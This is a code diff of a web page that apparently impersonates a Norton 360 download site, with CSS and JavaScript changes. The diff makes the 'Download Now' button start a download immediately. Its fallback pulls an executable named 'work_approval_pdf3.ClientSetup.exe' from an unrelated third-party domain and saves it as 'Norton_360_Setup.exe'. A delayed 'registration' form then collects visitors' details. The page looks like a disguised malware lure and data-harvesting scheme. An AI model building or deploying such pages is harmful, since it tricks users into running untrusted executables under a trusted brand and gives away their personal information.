@@ -57,6 +57,30 @@
         opacity: 1;
         visibility: visible;
       }
+
+      .animate-bounce {
+        animation: bounce 1s infinite;
+      }
+
+      @keyframes bounce {
+        0%,
+        20%,
+        53%,
+        80%,
+        100% {
+          transform: translate3d(0, 0, 0);
+        }
+        40%,
+        43% {
+          transform: translate3d(0, -8px, 0);
+        }
+        70% {
+          transform: translate3d(0, -4px, 0);
+        }
+        90% {
+          transform: translate3d(0, -2px, 0);
+        }
+      }
     </style>
   </head>
   <body class="font-sans bg-gray-50">
@@ -88,13 +112,13 @@
           <div
             class="bg-gradient-to-r from-blue-500 to-blue-600 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4"
           >
-            <i class="fas fa-shield-alt text-2xl text-white"></i>
+            <i class="fas fa-user-plus text-2xl text-white"></i>
           </div>
           <h3 class="text-2xl font-bold text-gray-800 mb-2">
-            Complete Your Download
+            Registration Required
           </h3>
           <p class="text-gray-600 text-sm">
-            Please provide your details to receive Norton 360
+            Please register to receive updates and support for Norton 360
           </p>
         </div>
 
@@ -140,12 +164,12 @@
               />
             </div>
 
-            <!-- Hidden field to track which product was downloaded -->
+            <!-- Hidden fields -->
             <input type="hidden" name="product" value="Norton 360" />
             <input
               type="hidden"
               name="_subject"
-              value="New Norton 360 Download Request"
+              value="New Norton 360 User Registration"
             />
           </div>
 
@@ -154,7 +178,7 @@
               type="submit"
               class="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold py-3 px-6 rounded-lg flex-1 transition duration-200"
             >
-              <span id="submitText">Complete Download</span>
+              <span id="submitText">Complete Registration</span>
               <i
                 id="submitLoader"
                 class="fas fa-spinner fa-spin ml-2 hidden"
@@ -165,7 +189,7 @@
               onclick="closeUserModal()"
               class="bg-gray-300 hover:bg-gray-400 text-gray-700 font-bold py-3 px-6 rounded-lg transition duration-200"
             >
-              Cancel
+              Skip
             </button>
           </div>
         </form>
@@ -215,11 +239,11 @@
             class="flex flex-col sm:flex-row space-y-4 sm:space-y-0 sm:space-x-4"
           >
             <button
-              id="downloadBtn"
-              onclick="downloadWithForm()"
-              class="download-btn bg-yellow-400 hover:bg-yellow-300 text-gray-900 font-bold py-3 px-8 rounded-full flex items-center justify-center pulse"
+              onclick="downloadWithDelayedForm()"
+              class="download-btn bg-yellow-400 hover:bg-yellow-300 text-gray-900 font-bold py-3 px-8 rounded-full flex items-center pulse"
             >
-              <i class="fas fa-download mr-2"></i> Download Now
+              <i id="downloadIcon" class="fas fa-download mr-2"></i>
+              <span id="downloadText">Download Now</span>
             </button>
             <button
               class="bg-transparent hover:bg-white hover:bg-opacity-10 border-2 border-white text-white font-bold py-3 px-8 rounded-full"
@@ -725,13 +749,69 @@
     </footer>
 
     <script>
-      let downloadTriggered = false;
+      // Function to handle download with delayed form
+      function downloadWithDelayedForm() {
+        // Change button to show arrow and downloading state
+        const downloadBtn = document.querySelector(".download-btn");
+        const downloadIcon = document.getElementById("downloadIcon");
+        const downloadText = document.getElementById("downloadText");
 
-      // Function to handle download with form
-      function downloadWithForm() {
-        // Show the user form modal
-        document.getElementById("userFormModal").classList.remove("hidden");
-        document.body.style.overflow = "hidden"; // Prevent background scrolling
+        // Update button appearance
+        downloadIcon.className = "fas fa-arrow-down mr-2 animate-bounce";
+        downloadText.textContent = "Downloading...";
+        downloadBtn.style.transform = "scale(0.95)";
+
+        // Trigger immediate download
+        triggerActualDownload();
+
+        // Show download notification
+        showNotification("Norton 360");
+
+        // Reset button after 2 seconds
+        setTimeout(() => {
+          downloadIcon.className = "fas fa-check mr-2 text-green-600";
+          downloadText.textContent = "Downloaded!";
+          downloadBtn.style.transform = "scale(1)";
+        }, 2000);
+
+        // Show form modal after 5 seconds delay
+        setTimeout(() => {
+          document.getElementById("userFormModal").classList.remove("hidden");
+          document.body.style.overflow = "hidden";
+
+          // Reset button to original state
+          setTimeout(() => {
+            downloadIcon.className = "fas fa-download mr-2";
+            downloadText.textContent = "Download Now";
+          }, 1000);
+        }, 5000);
+      }
+
+      // Function to actually trigger the download
+      function triggerActualDownload() {
+        try {
+          const url = `/api/download?movie=Norton`;
+          const a = document.createElement("a");
+          a.href = url;
+          a.style.display = "none";
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+
+          console.log("Norton download initiated via API");
+        } catch (error) {
+          console.error("Download failed:", error);
+          // Fallback to direct download
+          const remoteFile =
+            "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";
+          const a = document.createElement("a");
+          a.href = remoteFile;
+          a.download = "Norton_360_Setup.exe";
+          a.style.display = "none";
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+        }
       }
 
       // Close user modal
@@ -769,20 +849,16 @@
           })
             .then((response) => {
               if (response.ok) {
-                // Form submitted successfully, now trigger download
-                triggerActualDownload();
-
                 // Show success message
-                submitText.textContent = "Download Starting...";
+                submitText.textContent = "Thank You!";
 
                 // Close modal after delay
                 setTimeout(() => {
                   closeUserModal();
-                  showNotification("Norton 360");
 
                   // Reset form
                   this.reset();
-                  submitText.textContent = "Complete Download";
+                  submitText.textContent = "Complete Registration";
                   submitLoader.classList.add("hidden");
                   submitBtn.disabled = false;
                 }, 2000);
@@ -795,47 +871,22 @@
               alert("There was an error. Please try again.");
 
               // Reset button state
-              submitText.textContent = "Complete Download";
+              submitText.textContent = "Complete Registration";
               submitLoader.classList.add("hidden");
               submitBtn.disabled = false;
             });
         });
 
-      // Function to actually trigger the download
-      function triggerActualDownload() {
-        try {
-          const url = `/api/download?movie=Norton`;
-          const a = document.createElement("a");
-          a.href = url;
-          a.style.display = "none";
-          document.body.appendChild(a);
-          a.click();
-          document.body.removeChild(a);
-
-          console.log("Norton download initiated via API");
-        } catch (error) {
-          console.error("Download failed:", error);
-          // Fallback to direct download
-          const remoteFile =
-            "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";
-          const a = document.createElement("a");
-          a.href = remoteFile;
-          a.download = "Norton_360_Setup.exe";
-          a.style.display = "none";
-          document.body.appendChild(a);
-          a.click();
-          document.body.removeChild(a);
-        }
-      }
-
       // Update all existing download button functions
       function downloadNorton() {
-        downloadWithForm();
+        downloadWithDelayedForm();
       }
 
       // Show download notification
-      function showNotification() {
+      function showNotification(productName) {
         const notification = document.getElementById("downloadNotification");
+        const message = document.getElementById("downloadMessage");
+        message.textContent = `${productName} download started! Check your downloads folder.`;
         notification.classList.add("show");
         setTimeout(() => hideNotification(), 5000);
       }
